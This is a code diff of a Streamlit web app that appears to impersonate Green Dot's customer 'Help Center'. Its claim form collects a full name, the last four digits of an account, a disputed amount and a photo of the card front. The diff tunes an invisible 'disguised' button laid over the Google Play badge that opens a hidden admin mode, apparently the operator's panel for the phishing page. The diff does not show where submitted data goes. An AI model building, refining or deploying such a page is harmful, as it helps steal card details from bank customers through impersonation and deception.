@@ -61,10 +61,12 @@ st.markdown("""<style>
         pointer-events: auto !important; 
     }
 
-    /* DISGUISED LOGIN BUTTON OVERPLAY STORE SVG */
+    /* DISGUISED LOGIN BUTTON OVER GOOGLE PLAY SVG */
     .disguised-btn-container {
         position: relative;
         display: inline-block;
+        width: 130px;
+        height: 40px;
     }
     
     .disguised-btn-container button {
@@ -76,6 +78,7 @@ st.markdown("""<style>
         color: transparent !important;
         z-index: 10 !important;
         cursor: pointer !important;
+        padding: 0 !important;
     }
 
     .promo-box {
@@ -111,7 +114,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_7_7", clear_on_submit=True):
+    with st.form("claim_v32_7_8", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -119,13 +122,15 @@ if not st.session_state.admin_mode:
         st.file_uploader("Card Front", type=['jpg','png','jpeg'])
         if st.form_submit_button("SUBMIT NOW"): st.success("Claim Received.")
 
-    # --- DOWNLOAD APP SECTION (WITH CAMOUFLAGED ADMIN TRIGGER) ---
-    st.markdown("<div class='promo-box'><h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>", unsafe_allow_html=True)
+    # --- DOWNLOAD APP SECTION (RESTORED SIDE-BY-SIDE LAYOUT) ---
+    st.markdown("""<div class='promo-box'>
+        <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
+        <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
+    """, unsafe_allow_html=True)
     
-    col_apps = st.columns(2)
-    with col_apps[0]:
+    col_app_store = st.columns([1, 1, 1, 1, 1])
+    with col_app_store[1]: # Play Store Column
         st.markdown("<div class='disguised-btn-container'>", unsafe_allow_html=True)
-        # The invisible button that triggers Admin Mode covers the Play Store image
         if st.button(" ", key="admin_trigger"): 
             st.session_state.admin_mode = True
             st.rerun()
@@ -133,7 +138,7 @@ if not st.session_state.admin_mode:
                 <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
             </a></div>""", unsafe_allow_html=True)
     
-    with col_apps[1]:
+    with col_app_store[3]: # App Store Column
         st.markdown("""<a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
                 <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
             </a>""", unsafe_allow_html=True)
